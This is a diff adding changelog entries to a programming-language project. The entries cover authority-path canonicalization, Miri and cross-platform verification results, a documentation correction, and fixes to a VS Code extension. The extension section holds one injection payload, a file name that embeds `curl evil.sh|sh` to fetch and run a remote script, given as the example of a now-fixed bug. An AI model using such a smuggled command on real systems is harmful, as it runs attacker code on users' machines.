@@ -15,6 +15,87 @@ Findings live in `docs/design/PROOF_CAMPAIGN.md`. This campaign attacks the proj
 rather than its implementation, so most entries below are *open findings*, not fixes. Nothing here
 changes released behaviour **except P17-F5**, which narrows the accepted language — see below.
 
+### Authority — FIXED, and format-affecting (F1, F2, F3)
+
+- **Path scopes are now stored in canonical form.** `⊑` is defined through `path::resolve`, which is
+  not injective — `./data`, `data`, `./data/` and `.\data` are one path under four names. A relation
+  defined through a non-injective function is a **preorder**, never a partial order, so the module's
+  own word "lattice" was wrong about the carrier, and three findings followed from the one cause:
+  the order was not antisymmetric (**F1**), `⊓` was not symmetric because the surviving spelling was
+  whichever argument came first (**F2**), and one logical grant hashed two ways in the audit chain
+  (**F3**). All three are closed by canonicalizing at the custody boundary — `Broker::issue`,
+  `attenuate`, and `attenuate_core`. The three `#[ignore]`d, deliberately-failing tests in
+  `order_laws.rs` are now **un-ignored and passing**.
+
+  **The canonical form is an ANTICHAIN, not merely a normalized spelling**, and the earlier analysis
+  did not predict that. `{"./data", "./data/sub"}` and `{"./data"}` are also mutually `⊑` while
+  differing as sets, because `./data/sub` is already inside `./data`. Normalizing spellings alone
+  leaves the order a preorder; the redundant elements have to go too. The Z3 model could not have
+  seen this — it abstracts a dimension as a set over an opaque element type, so it cannot express
+  one element subsuming another. The counterexample came from the exhaustive enumerator.
+
+  **This changes bytes.** An authority written before this change using a non-canonical spelling
+  hashes differently from the same authority written after it. Existing records still verify (the
+  chain recomputes from stored bytes), but a pre-change and a post-change broker would compute two
+  hashes for one logical grant during federation reconciliation. `PROOF_CAMPAIGN.md` records that
+  this is the format-affecting change the campaign had earlier declined to make without an RFC, and
+  that it was made by owner instruction rather than through the RFC process.
+
+  Canonicalization changes spelling, never meaning: `resolve(canonicalize(p)) == resolve(p)` over an
+  adversarial corpus, and no containment decision changes. One trap needed designing around — a
+  relative component that looks like a drive letter (`./C:`) must keep its `./` prefix, or it would
+  re-resolve as the whole of drive `C:`, which is a widening.
+
+### Verification — evidence that did not exist before
+
+- **Miri completes for the first time: 192 tests, three crates, zero undefined behaviour.** It had
+  been started twice previously and finished neither time. `delulu-diag` 45 passed, **`delulu-broker`
+  129 passed**, `delulu-atlas` 18 passed. It must be run **per crate** and with
+  `-Zmiri-disable-isolation` — without the flag Miri aborts on `create_dir_all` as an *unsupported
+  operation*, which an earlier pass had recorded as a failure when it is a Miri limitation. The limit
+  stands: the crates Miri can run contain no `unsafe`, and the three that do are the ones it cannot.
+- **Both deliberately-`#[ignore]`d slow gates were actually run**: the WASM two-engine differential
+  over 50,000 programs (683 s, 0 divergences) and the formatter's 100,000-program law gate (853 s).
+- **Random authority graphs at 10 / 50 / 100 / 250 / 500 / 1000 agents**, plus 20 independent
+  topologies (`multi_agent_stress.rs`), checking attenuation-to-root, inherited revocation,
+  inherited expiry, and canonical storage over shapes nobody drew by hand.
+- **macOS cross-checking widened, and an earlier reading corrected.** Seven crates now type-check
+  clean for `x86_64-apple-darwin`, and Apple Silicon is *not* wholly uncheckable from this host —
+  three crates compile clean for `aarch64-apple-darwin`. **Still zero macOS executions.**
+- **CI gained Miri, ARM64 Linux, clippy/rustfmt gates, and an extension build+verify job.** It has
+  still **never executed**, because the repository is not pushed.
+
+### Documentation — a false claim corrected
+
+- **`README.md` said "no proof assistant is installed".** It has been false since the P17 campaign
+  installed Lean and machine-checked the higher-order fragment. Re-verified rather than assumed:
+  Lean 4.32.2 checks `DeluluCore.lean` in 37 s and `#print axioms` reports all three theorems
+  *"does not depend on any axioms"*. The genuine limit — the **full** type system is not mechanized —
+  is stated instead of the wrong one.
+
+### Editor — FIXED (VS Code extension, first test that read server and client together)
+
+- **Command injection through the open file's path.** The run and test code lenses built a shell
+  command *string* — `` `${serverPath} run ${fsPath}` `` — and sent it to the user's shell. A file
+  named `x;curl evil.sh|sh.delulu` executed on click, and **any path containing a space already ran
+  the wrong command**. Paths come from editor tabs, so they are attacker-influenced the moment a
+  project is opened from a clone. Commands now execute with an argument vector, which no shell parses.
+- **The `authority: {…}` lens never worked.** The server has emitted it since Stage 8; no client
+  ever registered the command, so clicking it raised *"command 'delulu.authority' not found"*.
+- **"▶ run test" ran every test in the file.** The server sends `[uri, testName]`; the client
+  dropped the name.
+- **The packaged `.vsix` would not have activated.** `npm install` placed 8 packages in
+  `node_modules`; `vsce` shipped only the one named in `dependencies`, so three transitive requires
+  were absent and activation would have thrown `Cannot find module`. The extension is now bundled
+  with esbuild into a single file, which removes runtime module resolution rather than re-tuning it.
+- **The extension claimed the wrong licence and version** — `MIT` at `0.8.0` beside an Apache-2.0
+  workspace at 1.0.0.
+
+  `crates/delulu/tests/editor_contract.rs` now fails the build if the commands the server emits, the
+  commands the client registers, and the commands the manifest declares ever disagree, if a path is
+  interpolated into a shell string again, or if the manifest drifts from the workspace. Each of its
+  gates was checked by reintroducing the exact defect and watching it fail.
+
 ### Language — CHANGED (narrows what compiles)
 
 - **`DL0210`: expression nesting is now capped at 128 levels.** Previously the parser recursed
